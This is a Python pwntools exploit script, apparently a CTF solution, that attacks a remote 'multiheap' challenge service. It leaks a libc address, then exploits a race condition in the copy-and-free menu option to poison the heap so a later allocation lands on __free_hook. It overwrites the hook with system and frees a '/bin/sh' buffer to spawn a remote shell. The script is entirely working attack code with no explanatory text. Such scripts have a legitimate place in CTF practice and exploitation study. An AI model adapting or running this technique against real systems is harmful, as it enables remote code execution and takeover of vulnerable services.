from pwn import *
from heaputils import *

def alloc(tp, size, mt):
	p.sendlineafter("Your choice: ","1")
	p.sendlineafter("Which: ",tp)
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Main or Thread? (m/t): ",mt)
	p.recvuntil("Done")

def free(index):
	p.sendlineafter("Your choice: ","2")
	p.sendlineafter("Index: ",str(index))

def free_fast(index):
	p.send("2\n{}\n".format(index))
	p.recvuntil("Index: ")

def write_long(index):
	p.sendlineafter("Your choice: ","3")
	p.sendlineafter("Index: ",str(index))
	data = p.recvuntil("==============================").strip("==============================")
	array = []
	for x in data.split("\n"):
		if x == '':
			continue
		array.append(int(x))
	return array

def copyAndFree(dst, src, copylen, yn):
	p.send("5\n{}\n{}\n{}\ny\n2\n{}\n".format(src,dst,copylen,dst))

def read_char(index, buffer, length):
	p.sendlineafter("Your choice: ","4")
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(length))
	p.sendafter("Content: ",buffer)

def copy(dst, src, copylen, yn):
	p.sendlineafter("Your choice: ","5")
	p.sendlineafter("Src index: ",str(src))
	p.sendlineafter("Dst index: ",str(dst))
	p.sendlineafter("Size: ",str(copylen))
	p.sendlineafter("Thread process? (y/n): ",yn)
	
if __name__ == "__main__":

	libc = ELF("./libc.so.6")

	p = remote("multiheap.chal.ctf.westerns.tokyo", 10001)
	alloc("long", 0x420, "m") # -> 0
	alloc("long", 0x500, "m") # -> 1, guard
	free(0)
	alloc("long",0x420,"m") # -> 1
	LIBC = write_long(1)[0] + 0x7fd1acf8a000 - 0x7fd1ad375ca0
	log.info("LIBC: 0x%x"%LIBC)


	# exploit the race condition
	free_hook = LIBC + libc.symbols['__free_hook']
	system = LIBC + libc.symbols['system']
	alloc("long",0x300,"m")
	alloc("char",0x300,"m")
	read_char(3, p64(free_hook), 0x8)
	copyAndFree(2,3,0x8,"y")
	sleep(0.1)

	# next-next malloc will return free hook
	
	alloc("char",0x300,"m")
	alloc("char",0x300,"m")
	read_char(4, p64(system), 8)
	read_char(3, "/bin/sh\x00", 8)
	free(3)


	p.interactive()